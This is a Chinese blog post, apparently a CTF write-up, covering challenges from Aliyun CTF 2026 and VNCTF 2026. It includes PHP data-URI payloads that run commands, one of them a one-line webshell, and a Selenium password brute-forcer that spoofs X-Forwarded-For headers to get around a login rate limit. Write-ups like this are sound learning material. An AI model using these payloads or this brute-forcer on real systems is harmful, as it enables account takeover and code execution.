@@ -1,0 +1,945 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="rightevil">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="最近新人赛还挺多的，都集中在这几天，做的还是满赶的，还好我也不是正经打比赛的，就是练习的，不是很着急。不得不说比赛和平时刷题还是不一样的，还有一个本校的hgame2026，这个因为还没结束，还不能放出wp 阿里云CTF2026这个比赛就做了一个签到，后面的就不是我这个菜鸟能碰瓷的了 Easy Login把源码交给Gemini分析   然后先用正常网址让visit访问，然后再构造cookie   v">
+<meta property="og:type" content="article">
+<meta property="og:title" content="最近的一些比赛">
+<meta property="og:url" content="https://rightevil.github.io/%E6%9C%80%E8%BF%91%E7%9A%84%E4%B8%80%E4%BA%9B%E6%AF%94%E8%B5%9B/index.html">
+<meta property="og:site_name" content="rightevil">
+<meta property="og:description" content="最近新人赛还挺多的，都集中在这几天，做的还是满赶的，还好我也不是正经打比赛的，就是练习的，不是很着急。不得不说比赛和平时刷题还是不一样的，还有一个本校的hgame2026，这个因为还没结束，还不能放出wp 阿里云CTF2026这个比赛就做了一个签到，后面的就不是我这个菜鸟能碰瓷的了 Easy Login把源码交给Gemini分析   然后先用正常网址让visit访问，然后再构造cookie   v">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769842367534-8678fb3e-6062-4009-9d2c-809ef1f4b4d6.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769842400827-4cb4e654-1734-472e-8096-ebcd4f54cb78.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769825048105-58c22be7-71b3-43d3-972a-19af55cfebca.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769825161713-2f4eba23-3c37-4e9c-ba7b-60085085465c.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769825264126-4b7968dc-40b1-4b6a-a73d-541acdaf202c.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769825464179-dd8b027d-9040-4a7a-ad12-677b782988dd.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769825657541-671f87f6-c0f1-4953-aa2f-625ccca26a2d.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769825811998-b4d90836-f36d-4e17-a04d-3fcbc85a2b77.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769826635536-d042c905-e91c-4b48-998f-3cc9efdcf526.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769826711133-a5df40b9-4913-4fb8-b1ba-17fa1845b9c5.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769826924969-7586fa85-444f-4b78-9c82-9a5b134a7d25.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769850367570-e059dd6f-4706-421a-9005-be46443912f8.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769844658929-dd26e47f-9ba0-4501-ad7b-9af07f51611f.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769844705243-b42b80c1-dd3f-4e3e-912b-c20249747357.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769844777186-589af012-72be-4582-82c3-f3216fb7b139.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769844836056-9feb4eb5-c5da-471c-b0ce-fc4f271f12a9.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769841206414-d05748b9-d028-4412-9884-f97eee2ba79c.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769841233836-20a47719-64fb-4535-bc28-d76816db4a76.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769846559506-c5e6f500-bbde-499a-ae98-4093a7d31b31.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769847906288-11125c06-56ea-4ff2-a1dd-8277cd79cdf9.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769847915924-26b4b155-50e1-4b03-954c-53d019b3b370.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769848119716-e9080ad4-3cea-4be4-af56-062b1c772ef3.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769848180960-8eef4365-9d0e-4c2b-9b41-e079ebe0eeb8.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769848401993-0f95f738-b655-44eb-86f4-c38efd7b1ccf.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769848437974-6b7ef6e3-059f-4a10-abdc-6af1613ba233.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769848545719-d66e966e-b715-4c70-b404-cb62ba8730bd.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769848656221-ae336453-f922-451f-818a-88a3ac295e3a.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769848924811-8f304c95-455b-4ccb-a52a-345f78122079.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769850131488-8ced480b-63e3-4be0-8aef-088b93530a39.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769850196592-33f7ebf0-21c8-4d9a-b810-353a1b705966.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769850209454-4a5159fb-258b-4e5a-bf1d-0e571222b90b.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769855572576-9f9bd0d0-24e9-4f34-98d1-b58a20d575e6.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769858438407-178802ab-f8ab-44ce-a080-02b6ef913f86.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769858495744-a71ce08c-83d7-4f21-8893-c9524e0a823a.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769858586168-0cd0a1df-6d0b-47af-9c0d-0a8f76e56e19.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769859013476-53b2a2c5-430d-4deb-a0fa-9240e2caed38.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769858894156-7e1502bd-ff7e-4559-b88a-5bb32e50dfbc.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769859037802-a90d3400-494a-4616-ac40-84ef4dcb023f.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769859737024-ed57835e-41f5-4673-bd10-9b313a6875cf.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769859754293-955db0ef-b3f2-4c13-aff4-a3335e5b6f4c.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769859903435-264e9da1-4bee-492d-8c26-557aa6615712.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769859920511-f91cc6dd-7847-436d-b62a-c9aada80ae13.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769861343030-30efcd5d-8120-4f54-a1eb-a49c15035fbc.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769862209244-81f5d610-6b21-4904-b64e-f380df83903d.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769862741529-f6f5e882-4abe-4c94-b584-69aaf7d5d99e.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769862801919-07004bf2-5bd0-40f6-b0c9-7a35a30055de.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769862913197-94463a70-22cc-49e5-941f-b45cf69f5cd1.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769865188999-c6c89441-8ff5-44e5-8ea9-c823644d4bbd.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769866409383-8c177ec7-27c7-492c-90c3-09998d32124f.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769866461281-8fa34082-a7d0-46dc-8e5d-f222217d5932.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769870918548-bff17011-a740-4101-853e-af6f25e867db.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769871159794-2a2f7499-624f-405f-8254-88268680907e.png">
+<meta property="article:published_time" content="2026-02-04T08:11:37.000Z">
+<meta property="article:modified_time" content="2026-02-04T08:19:11.156Z">
+<meta property="article:author" content="rightevil">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769842367534-8678fb3e-6062-4009-9d2c-809ef1f4b4d6.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>最近的一些比赛 - rightevil</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"rightevil.github.io","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":"UA-285611083-1","gtag":"G-TKYW22HREX","tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google Analytics -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript('https://www.google-analytics.com/analytics.js', function() {
+          window.ga = window.ga || function() { (ga.q = ga.q || []).push(arguments) };
+          ga.l = +new Date;
+          ga('create', 'UA-285611083-1', 'auto');
+          ga('send', 'pageview');
+        });
+      }
+    </script>
+  
+
+  
+    <!-- Google gtag.js -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript('https://www.googletagmanager.com/gtag/js?id=G-TKYW22HREX', function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag(){dataLayer.push(arguments);}
+          gtag('js', new Date());
+          gtag('config', 'G-TKYW22HREX');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<!-- hexo injector head_end start -->
+    <div id="fb-root"></div>
+    <script async defer crossorigin="anonymous" src="https://connect.facebook.net/zh_TW/sdk.js#xfbml=1&version=v12.0"></script>
+  <!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>舔狗日记</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                好友blog
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="最近的一些比赛"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-02-04 16:11" pubdate>
+          2026年2月4日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          <!-- compatible with older versions-->
+          12k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          <!-- compatible with older versions-->
+          104 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">最近的一些比赛</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>最近新人赛还挺多的，都集中在这几天，做的还是满赶的，还好我也不是正经打比赛的，就是练习的，不是很着急。不得不说比赛和平时刷题还是不一样的，还有一个本校的hgame2026，这个因为还没结束，还不能放出wp</p>
+<h1 id="阿里云CTF2026"><a href="#阿里云CTF2026" class="headerlink" title="阿里云CTF2026"></a>阿里云CTF2026</h1><p>这个比赛就做了一个签到，后面的就不是我这个菜鸟能碰瓷的了</p>
+<h2 id="Easy-Login"><a href="#Easy-Login" class="headerlink" title="Easy Login"></a>Easy Login</h2><p>把源码交给Gemini分析</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769842367534-8678fb3e-6062-4009-9d2c-809ef1f4b4d6.png" srcset="/img/loading.gif" lazyload></p>
+<p>然后先用正常网址让visit访问，然后再构造cookie</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769842400827-4cb4e654-1734-472e-8096-ebcd4f54cb78.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="vnctf2026"><a href="#vnctf2026" class="headerlink" title="vnctf2026"></a>vnctf2026</h1><h2 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769825048105-58c22be7-71b3-43d3-972a-19af55cfebca.png" srcset="/img/loading.gif" lazyload></p>
+<p>php代码审计</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769825161713-2f4eba23-3c37-4e9c-ba7b-60085085465c.png" srcset="/img/loading.gif" lazyload></p>
+<p>根据ai给的引导，我们先构造一个短标签+data协议</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">data:,&lt;?=`ls`;<br></code></pre></td></tr></table></figure>
+
+<p>成功执行了，现在找flag就行了，同时注意payload长度</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769825264126-4b7968dc-40b1-4b6a-a73d-541acdaf202c.png" srcset="/img/loading.gif" lazyload></p>
+<p>然后思路是用一句话木马</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769825464179-dd8b027d-9040-4a7a-ad12-677b782988dd.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">data:,&lt;?=`$_GET[a]`;&amp;a=ls /<br></code></pre></td></tr></table></figure>
+
+<p>也是成功绕过了，拿到了flag</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769825657541-671f87f6-c0f1-4953-aa2f-625ccca26a2d.png" srcset="/img/loading.gif" lazyload></p>
+<p>这个题目难度对于老手来说肯定很简单，毕竟签到题，对我们这样的新手来说要熟悉php源码，并且知道data协议不用//也可以</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769825811998-b4d90836-f36d-4e17-a04d-3fcbc85a2b77.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769826635536-d042c905-e91c-4b48-998f-3cc9efdcf526.png" srcset="/img/loading.gif" lazyload></p>
+<p>访问是一个登录页面，题目还给了一个password附件，可能是爆破，登录的请求包应该是做了加密处理的</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769826711133-a5df40b9-4913-4fb8-b1ba-17fa1845b9c5.png" srcset="/img/loading.gif" lazyload></p>
+<p>base64解码之后发现是p，q，n，一开始想的是rsa，但是后面又否定，因为pq都是计算私钥用的东西，怎么是自己提供给服务器，然后将js文件发给Gemini，得到结果</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769826924969-7586fa85-444f-4b78-9c82-9a5b134a7d25.png" srcset="/img/loading.gif" lazyload></p>
+<p>好家伙，这就很难搞了，我一直对js一窍不通，后面还是让Gemini先写一个脚本试试，但是不知道是加密方式有问题还是怎么，反正服务端返回something went wrong，搞得我只能用webdriver开启模拟浏览器，然后一个个密码输入进去，模拟点击登录，同时还要限制速率，不然服务端会提示hacker，花了我好几个小时，总算是弄出来了</p>
+<p>爆破脚本在这</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><code class="hljs shell">import random<br>import time<br>import threading<br>from concurrent.futures import ThreadPoolExecutor<br>from tqdm import tqdm<br>from selenium import webdriver<br>from selenium.webdriver.common.by import By<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">================= 配置区 =================</span><br>TARGET_URL = &quot;http://114.66.24.228:31046/&quot;<br>USERNAME = &quot;admin&quot;<br>THREAD_COUNT = 3<br>STOP_EVENT = threading.Event()<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">================= 核心工作函数 =================</span><br><br>def get_random_ip() :<br>    return f&quot;&#123;random.randint( 1 , 255 )&#125;.&#123;random.randint( 1 , 255 )&#125;.&#123;random.randint( 1 , 255 )&#125;.&#123;random.randint( 1 , 255 )&#125;&quot;<br><br><br>def worker(password_list , pbar) :<br>    if STOP_EVENT.is_set() :<br>        return<br><br>    # 使用标准 Selenium<br>    options = webdriver.ChromeOptions()<br>    # options.add_argument(&quot;--headless&quot;)<br>    driver = webdriver.Chrome( options=options )<br><br>    driver.get( TARGET_URL )<br><br>    try :<br>        for pwd in password_list :<br>            if STOP_EVENT.is_set() :<br>                break<br><br>            try :<br>                # --- 关键：利用 CDP 协议在发包前修改 Header ---<br>                # 这种方法不依赖任何第三方库，直接控制 Chrome 内核<br>                random_ip = get_random_ip()<br>                driver.execute_cdp_cmd( &#x27;Network.enable&#x27; , &#123;&#125; )<br>                driver.execute_cdp_cmd( &#x27;Network.setExtraHTTPHeaders&#x27; , &#123;<br>                    &#x27;headers&#x27; : &#123;&#x27;X-Forwarded-For&#x27; : random_ip&#125;<br>                &#125; )<br><br>                # 定位元素<br>                user_box = driver.find_element( By.CSS_SELECTOR , &quot;input[type=&#x27;text&#x27;]&quot; )<br>                pass_box = driver.find_element( By.CSS_SELECTOR , &quot;input[type=&#x27;password&#x27;]&quot; )<br>                login_btn = driver.find_element( By.TAG_NAME , &quot;button&quot; )<br>                result_label = driver.find_element( By.ID , &quot;result&quot; )<br><br>                # 输入与点击<br>                user_box.clear()<br>                user_box.send_keys( USERNAME )<br>                pass_box.clear()<br>                pass_box.send_keys( pwd )<br>                login_btn.click()<br><br>                # 等待回包<br>                time.sleep( 0.6 )<br>                status = result_label.text.strip()<br><br>                if &quot;hacker&quot; in status.lower() :<br>                    pbar.write( f&quot;[!] 触发 WAF (hacker!) - 正在使用 IP: &#123;random_ip&#125;&quot; )<br>                    time.sleep( 1.5 )<br>                    continue<br><br>                if &quot;login failed!&quot; in status :<br>                    pbar.update( 1 )<br>                    continue<br><br>                # 成功判断<br>                if status and &quot;login failed!&quot; not in status :<br>                    STOP_EVENT.set()<br>                    pbar.write( f&quot;\n\n&#123;&#x27;=&#x27; * 50&#125;\n[SUCCESS] 密码正确: &#123;pwd&#125;\n[RESULT]: &#123;status&#125;\n&#123;&#x27;=&#x27; * 50&#125;&quot; )<br>                    break<br><br>            except Exception :<br>                driver.get( TARGET_URL )<br>                time.sleep( 1 )<br>                continue<br>    finally :<br>        driver.quit()<br><br><br>def brute_force() :<br>    # 读取字典<br>    with open( &#x27;password&#x27; , &#x27;r&#x27; ) as f :<br>        passwords = [ line.strip() for line in f if line.strip() ]<br><br>    # 置顶已知可能的密码<br>    target_pwd = &quot;QQr0T7AvjtaSxFbiqv3yv7zw&quot;<br>    if target_pwd in passwords :<br>        passwords.remove( target_pwd )<br>    passwords.insert( 0 , target_pwd )<br><br>    total = len( passwords )<br>    chunk_size = (total // THREAD_COUNT) + 1<br>    password_chunks = [ passwords[ i :i + chunk_size ] for i in range( 0 , total , chunk_size ) ]<br><br>    pbar = tqdm( total=total , desc=&quot;CDP-Bruting&quot; , unit=&quot;pwd&quot; , dynamic_ncols=True )<br><br>    with ThreadPoolExecutor( max_workers=THREAD_COUNT ) as executor :<br>        futures = [ executor.submit( worker , chunk , pbar ) for chunk in password_chunks ]<br>        for future in futures :<br>            future.result()<br><br>    pbar.close()<br><br><br>if __name__ == &quot;__main__&quot; :<br>    brute_force()<br></code></pre></td></tr></table></figure>
+
+<p>运行该脚本需要本地安装了chrome的webdriver，且版本需要对应上</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769850367570-e059dd6f-4706-421a-9005-be46443912f8.png" srcset="/img/loading.gif" lazyload></p>
+<p>做完第二天，在群里听了大佬的指导后，将js脚本反混淆一下给ai，成功写出了一个可爆破的脚本，这个脚本不管什么时候都可以用，不过就是没有解密响应体，要自己去浏览器输出得到flag</p>
